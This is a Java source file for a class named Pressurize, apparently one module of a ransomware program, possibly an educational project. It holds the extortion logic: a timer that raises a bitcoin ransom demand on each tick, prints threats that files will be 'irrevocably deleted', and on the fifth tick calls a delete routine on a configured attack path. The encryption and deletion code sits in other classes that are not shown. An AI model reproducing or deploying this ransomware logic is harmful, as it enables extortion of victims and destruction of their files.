package pressurize;

import configuration.Configuration;
import configuration.ConsoleCorrespondation;
import console.Console;
import console.TextColor;
import leverCom.RansomwareReflector;
import person.IConsoleUser;

import java.util.Objects;
import java.util.Timer;
import java.util.TimerTask;

public class Pressurize implements IConsoleUser {
    private final Console console;
    //private Boolean isPaid = false;
    private final RansomwareReflector reflector;
    private Long delay;
    private Integer timerCount = 0;
    private Timer timer;

    public Pressurize(Console console, Long delay) {
        this.delay = delay;
        this.console = console;
        this.reflector = new RansomwareReflector();
        this.reflector.setPath(Configuration.instance.pathToAttack);
    }

    private void restartTimer() {
        cancelTimer();
        invokeTimer();
    }

    public void invokeTimer() {
        try {
            if (Objects.nonNull(this.timer)) throw new Exception("Timer already instantiated");
            this.timer = new Timer();
            TimerTask task = new TimerTask() {
                @Override
                public void run() {
                    timerCount++;
                    Double toPay = 0.02755 + timerCount * 0.01;


                    if (timerCount < 4) {
                        ConsoleCorrespondation.M_RANSOMINCREASED.setValue(">>Amount to pay increased by 0,01 BTC to: " + toPay + " BTC");
                        writeToConsole(ConsoleCorrespondation.M_RANSOMINCREASED, TextColor.RED);

                    } else if(timerCount == 4) {
                        ConsoleCorrespondation.M_RANSOMFINAL.setValue(">>Pay " + toPay + " BTC immediately or your files will be irrevocably deleted!");
                        writeToConsole(ConsoleCorrespondation.M_RANSOMFINAL, TextColor.RED);
                    }else if(timerCount == 5){
                        reflector.delete();
                        writeToConsole(ConsoleCorrespondation.M_BUSTED, TextColor.RED);
                    }

                    if (timerCount < 5) restartTimer();
                }
            };
            timer.schedule(task, this.delay);
        } catch (Exception ex) {
            System.err.println(ex.getMessage());
            ex.printStackTrace();
        }
    }

    public void cancelTimer() {
        this.timer.cancel();
        this.timer.purge();
        this.timer = null;
    }

    @Override
    public void writeToConsole(ConsoleCorrespondation text, TextColor color) {
        this.console.writeln(text, color);
    }

    public void writeToConsole(String text, TextColor color) {
        this.console.writeln(text, color);
    }

    public void writeToConsole(ConsoleCorrespondation text) {
        this.console.writeln(text);
    }
}

